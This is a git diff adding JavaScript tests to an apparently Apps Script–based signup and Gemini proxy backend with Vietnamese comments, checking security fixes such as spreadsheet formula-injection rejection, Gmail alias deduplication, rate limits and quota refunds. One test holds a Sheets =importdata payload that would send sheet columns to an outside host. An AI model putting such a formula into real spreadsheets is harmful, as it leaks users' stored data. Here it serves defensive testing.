@@ -258,3 +258,55 @@ test('quản trị: đặt lại mật khẩu, cấp quyền admin bằng hàm c
   g.run("datQuanTri('A@mail.com')");
   assert.equal(login(g, { mk: 'mat-khau-moi-1' }).data.me.vaitro, 'admin');
 });
+
+// ─── Sau review bảo mật ───────────────────────────────────
+
+test('email dạng công thức Sheets (=importdata…) bị từ chối; mọi ô người dùng nhập đều không thành công thức', () => {
+  const g = setup();
+  const evil = '=importdata("http://x.co/?"&textjoin(",",1,b:f))&"@a.bc"';
+  assert.equal(signup(g, { email: evil }).code, 'email_sai');
+  assert.equal(signup(g, { email: '+1@a.bc' }).code, 'email_sai');
+  assert.equal(signup(g, { ten: '=HYPERLINK("http://x")' }).ok, true);
+  const row = rows(g)[1];
+  assert.ok(row.every((v) => !/^[=+\-@]/.test(String(v))), JSON.stringify(row));
+});
+
+test('gmail có dấu chấm / +nhãn vẫn tính là cùng một email (không nuôi nhiều tài khoản lấy lượt miễn phí)', () => {
+  const g = setup();
+  assert.equal(signup(g, { email: 'an.nguyen@gmail.com' }).ok, true);
+  assert.equal(signup(g, { email: 'annguyen+2@gmail.com' }).code, 'da_ton_tai');
+  assert.equal(signup(g, { email: 'AN.NGUYEN+abc@googlemail.com' }).code, 'da_ton_tai');
+  assert.equal(signup(g, { email: 'an.nguyen+2@congty.vn' }).ok, true, 'tên miền khác gmail giữ nguyên');
+});
+
+test('dò email bằng đăng ký cũng tính vào trần đăng ký mỗi giờ', () => {
+  const g = setup();
+  g.run('DK_MOI_GIO = 3');
+  signup(g);
+  signup(g); signup(g);                                     // 2 lần dò trùng
+  assert.equal(signup(g, { email: 'moi@mail.com' }).code, 'busy');
+});
+
+test('Gemini đã làm việc (quá giờ, bị chặn, lỗi yêu cầu) thì vẫn tính lượt; chỉ trả lượt khi Gemini chưa làm gì', () => {
+  let mode = 'timeout';
+  const g = setup((url, o, resp) => {
+    if (url.includes('/models?')) return resp(200, MODELS);
+    if (mode === 'timeout') throw new Error('Exception: Timeout');
+    if (mode === '400') return resp(400, { error: { code: 400, status: 'INVALID_ARGUMENT', message: 'bad schema' } });
+    if (mode === 'net') throw new Error('Exception: DNS error');
+    return resp(429, { error: { code: 429 } });
+  });
+  const tk = signup(g).data.token;
+  const used = () => g.post({ action: 'toi', token: tk }).data.me.luot.dung;
+  g.post(gen(tk)); assert.equal(used(), 1, 'quá giờ vẫn tính');
+  mode = '400'; g.post(gen(tk)); assert.equal(used(), 2, 'yêu cầu hỏng vẫn tính');
+  mode = 'net'; g.post(gen(tk)); assert.equal(used(), 2, 'không tới được Gemini → trả lượt');
+  mode = '429'; g.post(gen(tk)); assert.equal(used(), 2, 'hết hạn mức key → trả lượt');
+});
+
+test('responseSchema quá lớn → bad', () => {
+  const g = setup();
+  const tk = signup(g).data.token;
+  const big = { type: 'OBJECT', properties: Object.fromEntries(Array.from({ length: 3000 }, (_, i) => [`f${i}`, { type: 'STRING' }])) };
+  assert.equal(g.post(gen(tk, { generationConfig: { responseSchema: big } })).code, 'bad');
+});
